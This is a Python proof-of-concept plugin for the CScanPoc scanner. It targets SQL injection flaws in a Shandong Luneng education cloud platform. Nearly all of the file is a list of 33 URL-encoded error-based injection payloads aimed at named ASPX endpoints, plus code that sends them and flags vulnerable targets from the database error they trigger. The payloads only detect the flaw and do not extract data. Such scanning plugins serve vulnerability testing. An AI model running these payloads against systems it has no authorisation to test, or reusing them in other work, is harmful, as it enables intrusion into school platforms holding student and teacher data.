# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'SoullonEdu_0001'  # 平台漏洞编号，留空
    name = '山东鲁能教育云公共服务平台系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-08-09'  # 漏洞公布时间
    desc = '''
        山东鲁能教育云公共服务平台系统。
        教育云公共服务平台系统参数过滤不严谨，存在多处SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '教育云公共服务平台系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '0d514f83-31bb-4bd2-975f-38f7a406d753'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payloads = [
                "/public/Newsvideo.aspx?NewID=convert%28int,%27tes%27%2b%27tvul%27%29",
                "/PlatFormN/PlatformResouseN/ResourceShow.aspx?fid=349193%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
                "/Portal/Index?depId=3601010025%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
                "/PlatFormN/PlatformResouseN/PaperResourceView.aspx?paperid=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
                "/PlatFormN/PlatformResouseN/TopicSearchIndexList.aspx?tid=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
                "/ClassSpace/CS_ExcellentResource/CSResource.aspx?classID=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
                "/ClassSpace/CS_FeelingWall/FeelingWallIndex.aspx?classID=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
                "/Space/Institution/InstitutionEdit.aspx?depCode=3601010025%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
                "/Space/Institution/StudentOrTeacherIndex.aspx?depCode=3601010025%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
                "/Space/Institution/ArticleIndex.aspx?depCode=3601010025%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
                "/Space/Institution/InstitutionGroupIndex.aspx?depCode=3601010025%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
                "/Space/Institution/InstitutionSpaceResIndex.aspx?depCode=3601010025%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
                "/Space/Institution/InstitutionIndex.aspx?depCode=3601010025%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
                "/Public/PublicComment4Resource.aspx?targetID=137999%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
                "/Public/Video.aspx?FID=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
                "/PlatFormN/PlatformResouseN/QuestionSearchAnswerList.aspx?questionID=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
                "/ClassSpace/CS_AlbumAndPhoto/AlbumAndPhotoUploadPhoto.aspx?classID=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
                "/ClassSpace/CS_AlbumAndPhoto/AlbumAndPhotoAlbumPhotoIndex.aspx?albumID=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
                "/Space/Institution/ArticleList.aspx?PageTag=n&page=0&depid=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
                "/Space/Institution/InstitutionIndexList.aspx?PageTag=n&page=0&depid=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
                "/Space/Institution/InstitutionGroupList.aspx?PageTag=n&page=0&depCode=3601010025%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
                "/Space/Institution/InstitutionNoticeList.aspx?PageTag=n&page=0&depid=25%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
                "/Public/PublicComment4Resource.aspx?targetID=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
                "/PlatForm/PlatformResouse/PIndex.aspx?p_id=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
                "/ClassSpace/ClassHomeworkSpace/CHSpace.aspx?&classID=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
                "/ClassSpace/CS_AlbumAndPhoto/AlbumAndPhotoAlbumPhotoList.aspx?albumID=&classID=25%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
                "/ClassSpace/CS_FeelingWall/FeelingWallIndex.aspx?classID=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
                "/ClassSpace/CS_Index/ClassMasterIntro.aspx?classID=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
                "/ClassSpace/CS_Index/ClassTeacherList.aspx?classID=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
                "/ClassSpace/CS_Index/ClassMemberList.aspx?classID=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
                "/ClassSpace/CS_Index/ClassPhotoShow.aspx?classID=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
                "/ClassSpace/CS_Index/ClassTimeTable.aspx?classID=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
                "/ClassSpace/CS_Index/ClassStatInfo.aspx?classID=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
            ]
            for payload in payloads:
                verify_url = self.target + payload
                req = requests.get(verify_url)

                if req.status_code == 500 and 'testvul' in req.text:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
